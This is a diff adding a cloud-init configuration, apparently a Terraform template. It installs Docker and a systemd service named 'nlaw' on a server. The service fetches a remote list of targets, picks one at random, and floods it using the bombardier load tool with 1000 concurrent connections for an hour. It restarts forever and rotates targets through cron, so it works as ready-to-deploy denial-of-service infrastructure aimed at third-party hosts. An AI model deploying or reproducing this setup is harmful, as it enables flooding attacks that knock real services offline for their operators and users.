@@ -1,0 +1,55 @@
+#cloud-config
+
+write_files:
+  - path: /etc/systemd/system/nlaw.service
+    content: |
+      [Unit]
+      Description=nlaw
+      After=docker.service
+      Requires=docker.service
+
+      [Service]
+      TimeoutStartSec=0
+      Restart=always
+      ExecStart=/var/nlaw.sh
+
+      [Install]
+      WantedBy=multi-user.target
+
+  - path: /var/nlaw.sh
+    content: |
+      #!/usr/bin/env sh
+      
+      export TRGT=$(curl ${target_source} | shuf | head -n 1)
+      
+      echo $TRGT
+      
+      docker rm -f nlaw || true
+      exec /usr/bin/docker run --name nlaw --rm alpine/bombardier -c 1000 -d 1h $TRGT
+runcmd:
+  - |
+    chmod +x /var/nlaw.sh
+    
+    apt update
+    apt-get install -y \
+      ca-certificates \
+      curl \
+      gnupg \
+      lsb-release
+    
+    curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg
+    
+    echo \
+      "deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu \
+      $(lsb_release -cs) stable" | sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
+    
+    sudo apt-get update
+    sudo apt-get install -y docker-ce docker-ce-cli containerd.io
+    
+    systemctl daemon-reload
+    systemctl enable nlaw
+    systemctl start nlaw
+    
+    echo "${rotate} systemctl restart nlaw" | crontab - 
+    
+    apt install -y nload
